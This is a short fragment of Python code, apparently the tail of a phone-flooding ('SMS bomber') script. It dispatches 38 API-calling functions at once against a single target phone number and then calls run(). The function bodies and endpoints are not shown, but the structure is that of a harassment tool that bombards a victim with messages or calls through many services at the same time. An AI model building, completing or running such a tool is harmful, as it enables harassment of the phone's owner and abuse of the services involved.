		threading.submit(api1, phone)
		threading.submit(api2, phone)
		threading.submit(api3, phone)
		threading.submit(api4, phone)
		threading.submit(api5, phone)
		threading.submit(api6, phone)
		threading.submit(api7, phone)
		threading.submit(api8, phone)
		threading.submit(api9, phone)
		threading.submit(api10, phone)
		threading.submit(api11, phone)
		threading.submit(apiig, phone)
		threading.submit(api12, phone)
		threading.submit(api13, phone)
		threading.submit(api14, phone)
		threading.submit(api15, phone)
		threading.submit(api16, phone)
		threading.submit(api17, phone)
		threading.submit(api18, phone)
		threading.submit(api19, phone)
		threading.submit(api20, phone)
		threading.submit(api21, phone)
		threading.submit(api22, phone)
		threading.submit(api23, phone)
		threading.submit(api24, phone)
		threading.submit(api25, phone)
		threading.submit(api26, phone)
		threading.submit(api27, phone)
		threading.submit(api28, phone)
		threading.submit(api29, phone)
		threading.submit(api30, phone)
		threading.submit(api31, phone)
		threading.submit(api32, phone)
		threading.submit(api33, phone)
		threading.submit(api34, phone)
		threading.submit(api35, phone)
		threading.submit(api36, phone)
		threading.submit(apicall, phone)
	
run()
